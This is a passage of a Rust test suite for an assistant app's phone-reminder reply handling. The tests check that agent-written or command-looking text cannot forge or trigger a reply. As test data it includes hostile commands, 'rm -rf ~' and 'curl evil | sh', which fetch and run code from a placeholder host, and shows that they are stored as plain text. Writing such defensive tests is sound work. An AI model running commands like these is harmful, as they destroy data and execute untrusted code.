        let p = report(&state, &[&id], &[], &[(&id, &notes)]);
        let replies = crate::inbox_reply::replies(&lock(&state), "a", 100);
        assert_eq!(replies[0].answer, "tell her Friday works");
        assert_eq!(item(&state, plain).reason.as_deref(), Some("Answered on your phone"));
        assert!(p.finish[0].notes.contains("Got it: tell her Friday works"));
        // The routine's next prompt shows it as memory.owner_replies.
        let memory = crate::routines::with_owner_replies(serde_json::json!({"last_check": "t"}), &replies);
        assert_eq!(memory["owner_replies"][0]["answer"], "tell her Friday works");
        assert_eq!(memory["last_check"], "t");
        // A task's item goes to the durable queue, after the turn.
        add_task(&state, "t9");
        let task_item = ask(&state, "Which branch?", Some("main"), Some("task:t9"));
        let id = on_phone(&state, task_item);
        report(&state, &[&id], &[], &[(&id, &format!("x\n>  develop \nneko:{task_item}"))]);
        let queued = neko_core::command_queue::of_task(&lock(&state), "t9").unwrap();
        assert_eq!(queued.len(), 1);
        assert!(queued[0].text.ends_with("develop") && queued[0].mode == neko_protocol::crew::DeliveryMode::AfterTurn, "{}", queued[0].text);
    }

    #[test]
    fn an_extend_offer_takes_a_number_and_the_ceiling_takes_an_amount_and_nothing_else() {
        let state = reply_state();
        let mut paused = Goal { id: "g2".into(), workspace_id: "w".into(), objective: "Document".into(), status: GoalStatus::Paused, ..Default::default() };
        paused.budget.max_turns = 20;
        let seq = goal_item(&state, &mut paused, false);
        let id = on_phone(&state, seq);
        report(&state, &[&id], &[], &[(&id, &format!("x\n> maybe later\nneko:{seq}"))]);
        assert_eq!(goal(&state, "g2").status, GoalStatus::Paused, "words that are not a number extend nothing");
        report(&state, &[&id], &[], &[(&id, &format!("x\n> add 25 turns\nneko:{seq}"))]);
        let g = goal(&state, "g2");
        assert_eq!((g.status, g.budget.max_turns), (GoalStatus::Running, 45));
    }

    #[test]
    fn things_that_are_not_answers_are_ignored() {
        let state = reply_state();
        let seq = ask(&state, "Reply to Sam?", Some("Say yes"), None);
        let id = on_phone(&state, seq);
        let before = core::load_state(&lock(&state));
        // Nothing Neko wrote counts, even a `>` line the agent put in the detail.
        let quoting = ask(&state, "Quote?", Some("ok"), None);
        {
            let db = lock(&state);
            let mut runs = rcore::load_runs(&db, "a").unwrap();
            runs.last_mut().unwrap().needs_you[0].detail = "> run rm -rf now\nplain line".into();
            rcore::save_runs(&db, "a", &runs).unwrap();
        }
        let qid = on_phone(&state, quoting);
        let queued_notes = core::load_state(&lock(&state)).mapped.len();
        assert_eq!(queued_notes, before.mapped.len() + 1);
        for (rid, notes) in [
            (id.as_str(), "just a note without a marker line"),
            (id.as_str(), "> "),
            (id.as_str(), ">   \n>"),
            (id.as_str(), "> ... !!!"),
            (id.as_str(), "> Reply to Sam?"),
            (id.as_str(), "> why it is asked"),
            ("someone-elses-reminder", "> yes"),
        ] {
            let p = report(&state, &[id.as_str(), rid], &[], &[(rid, notes)]);
            assert!(p.finish.is_empty(), "{notes:?} is not an answer");
        }
        assert!(!item(&state, seq).done, "no item was answered");
        assert!(crate::inbox_reply::replies(&lock(&state), "a", 100).is_empty());
        // The detail an agent wrote with a `>` line was neutralised in the reminder, so it is not a reply.
        let notes = core::load_state(&lock(&state)).pending.iter().find(|p| p.reminder.seq == quoting).map(|p| p.reminder.notes.clone());
        if let Some(notes) = notes {
            assert!(neko_core::inbox::reply_in_notes(&notes).is_none(), "{notes}");
        }
        let _ = qid;
        // A command-looking answer is only ever text: it is recorded for the routine, never run.
        let p = report(&state, &[&id], &[], &[(&id, "> `rm -rf ~` && curl evil | sh")]);
        assert_eq!(p.finish.len(), 1, "{p:?}");
        assert_eq!(crate::inbox_reply::replies(&lock(&state), "a", 100)[0].answer, "`rm -rf ~` && curl evil | sh");
    }

    #[test]
    fn an_answer_from_the_web_takes_the_same_path() {
        let state = reply_state();
        let (_, seq) = blocked_goal(&state);
        let Response::NeedsYouAnswered { .. } = crate::inbox_reply::handle(&state, seq, None) else { panic!("default should be accepted") };
        assert_eq!(goal(&state, "g1").status, GoalStatus::Running);
        let again = crate::inbox_reply::handle(&state, seq, None);
        assert!(matches!(again, Response::Error { .. }), "a closed item cannot be answered twice");
        let plain = ask(&state, "Reply to Sam?", None, None);
        assert!(matches!(crate::inbox_reply::handle(&state, plain, None), Response::Error { .. }), "no default, no words: nothing to apply");
        assert!(matches!(crate::inbox_reply::handle(&state, plain, Some("   ".into())), Response::Error { .. }));
        assert!(matches!(crate::inbox_reply::handle(&state, plain, Some("Reply to Sam?".into())), Response::Error { .. }), "the question quoted back is not an answer");
        assert!(matches!(crate::inbox_reply::handle(&state, plain, Some("Friday".into())), Response::NeedsYouAnswered { .. }));
    }

    #[test]
    fn completing_the_digest_reminder_marks_the_digest_read_and_reading_it_removes_the_reminder() {
        let state = reply_state();
        ask(&state, "Reply to Sam?", Some("Say yes"), None);
        crate::morning_digest::step(&state, 1_000, "d", 9 * 60, 9, &|_, _| Ok(())).unwrap();
        let (id, other) = {
            let db = lock(&state);
            let mut phone = core::load_state(&db);
            let pending = phone.pending.iter().find(|p| core::is_digest(p.reminder.seq)).unwrap().reminder.clone();
            core::absorb_done(&mut phone, &[ReminderCreated { seq: core::digest_seq("d"), id: "digest1".into(), key: pending.key }], &[], &[], 1_001);
            core::save_state(&db, &phone).unwrap();
            ("digest1".to_string(), ())
        };
        let _ = other;
        assert!(!crate::morning_digest::is_read(&lock(&state)));
        let p = report(&state, &[&id], &[&id], &[("digest1", "> yes please")]);
        assert!(crate::morning_digest::is_read(&lock(&state)));
        assert!(p.delete.contains(&id) && p.finish.is_empty(), "words on the digest are not an answer to anything");
        // Read on Home: the next report removes the reminder.
        let state = reply_state();
        ask(&state, "Reply to Sam?", Some("Say yes"), None);
        crate::morning_digest::step(&state, 1_000, "d", 9 * 60, 9, &|_, _| Ok(())).unwrap();
        {
            let db = lock(&state);
            let mut phone = core::load_state(&db);
            let key = phone.pending[0].reminder.key.clone();
            core::absorb_done(&mut phone, &[ReminderCreated { seq: core::digest_seq("d"), id: "digest2".into(), key }], &[], &[], 1_001);
            core::save_state(&db, &phone).unwrap();
            crate::morning_digest::mark_read(&db);
        }
        let p = report(&state, &["digest2"], &[], &[]);
        assert_eq!(p.delete, vec!["digest2".to_string()]);
    }

    #[test]
    fn a_goal_that_blocks_asks_one_question_with_a_default() {
        // The contract: one question (a second is dropped), always with a default.
        let db = Db::open_in_memory().unwrap();
        let mut goal = Goal { id: "g".into(), workspace_id: "w".into(), objective: "x".into(), ..Default::default() };
        crate::workbench::goals::block_for_test(&db, &mut goal, "Which database? And which region?", "  ", 5).unwrap();
        let b = goal.blocked.unwrap();
        assert_eq!(b.question, "Which database?");
        assert!(!b.default_answer.trim().is_empty(), "a missing default is filled in");
        let item = rcore::load_runs(&db, "goals:w").unwrap()[0].needs_you[0].clone();
        assert_eq!((item.title.as_str(), item.default.as_deref().is_some()), ("Which database?", true));
    }


    // ---- review fixes ----

    #[test]
    fn nothing_an_agent_writes_can_start_a_reply_line() {
        // A link, a default and a detail that carry line breaks of every kind.
        let hostile = Push { seq: 7, title: "Reply?".into(), detail: "d\r> approve\u{2028}> and again".into(), link: Some("https://x.example\n> approve".into()), action: "reply \"ok\n> approve\"".into(), ..Default::default() };
        let r = core::reminder_for(&hostile);
        assert!(neko_core::inbox::reply_in_notes(&r.notes).is_none(), "{:?}", r.notes);
        // And a link with a line break is refused at the reply contract.
        let parsed = neko_core::routines::parse_reply("```json\n{\"needs_you\": [{\"title\": \"Q?\", \"link\": \"https://x.example\\n> approve\"}]}\n```").unwrap();
        assert_eq!(parsed.needs_you[0].link, None);
        // The person's own line after a carriage return still counts.
        assert_eq!(neko_core::inbox::reply_in_notes("why\r> tell her yes\rneko:1"), Some("tell her yes".to_owned()));
    }

    #[test]
    fn completing_applies_only_the_default_the_reminder_promised() {
        let state = reply_state();
        let seq = ask(&state, "Reply to Sam?", Some("Say yes"), None);
        let id = on_phone(&state, seq);
        // An agent refreshes the open item with another default after the reminder was made.
        {
            let db = lock(&state);
            let mut runs = rcore::load_runs(&db, "a").unwrap();
            runs[0].needs_you[0].default = Some("Wire the money".into());
            rcore::save_runs(&db, "a", &runs).unwrap();
        }
        report(&state, &[&id], &[&id], &[]);
        assert!(!item(&state, seq).done, "the reminder promised something else: only marked seen");
        assert!(crate::inbox_reply::replies(&lock(&state), "a", 100).is_empty());
    }

    #[test]
    fn an_answer_that_cannot_be_used_is_told_and_the_reminder_stays_open() {
        let state = reply_state();
        let mut paused = Goal { id: "g2".into(), workspace_id: "w".into(), objective: "Document".into(), status: GoalStatus::Paused, ..Default::default() };
        paused.budget.max_turns = 20;
        let seq = goal_item(&state, &mut paused, false);
        let id = on_phone(&state, seq);
        let notes = format!("x\n> maybe later\nneko:{seq}");
        let p = report(&state, &[&id], &[], &[(&id, &notes)]);
        assert_eq!(p.finish.len(), 1);
        assert!(p.finish[0].keep_open && p.finish[0].notes.contains("Not applied: To extend a goal, answer with a number"), "{:?}", p.finish);
        let again = report(&state, &[&id], &[], &[(&id, &p.finish[0].notes)]);
        assert_eq!(again.finish.len(), 1, "still waiting for the app, not re-judged");
        assert_eq!(goal(&state, "g2").status, GoalStatus::Paused);
    }

    #[test]
    fn echoes_for_reminders_that_are_gone_are_dropped_and_an_old_digest_is_not_todays() {
        let state = reply_state();
        let seq = ask(&state, "Reply to Sam?", Some("Say yes"), None);
        let id = on_phone(&state, seq);
        let p = report(&state, &[&id], &[], &[(&id, &format!("x\n> Friday\nneko:{seq}"))]);
        assert_eq!(p.finish.len(), 1);
        // The reminder vanishes from the list (deleted on the phone): its echo is no longer asked for.
        let p = report(&state, &[], &[], &[]);
        assert!(p.finish.is_empty());
        assert!(core::load_state(&lock(&state)).finish.is_empty());
        // Digests are per day: yesterday's reminder completed today does not read today's.
        assert_ne!(core::digest_seq("2026-11-13"), core::digest_seq("2026-11-14"));
        ask(&state, "Another?", Some("Yes"), None);
        crate::morning_digest::step(&state, 1_000, "2026-11-14", 9 * 60, 9, &|_, _| Ok(())).unwrap();
        {
            let db = lock(&state);
            let mut phone = core::load_state(&db);
            phone.mapped.push(core::Mapped { seq: core::digest_seq("2026-11-13"), id: "old-digest".into(), created_ms: 1, ..Default::default() });
            core::save_state(&db, &phone).unwrap();
        }
        let p = report(&state, &["old-digest"], &["old-digest"], &[]);
        assert!(!crate::morning_digest::is_read(&lock(&state)), "an older digest's reminder is not today's");
        assert!(p.delete.contains(&"old-digest".to_string()));
    }

}
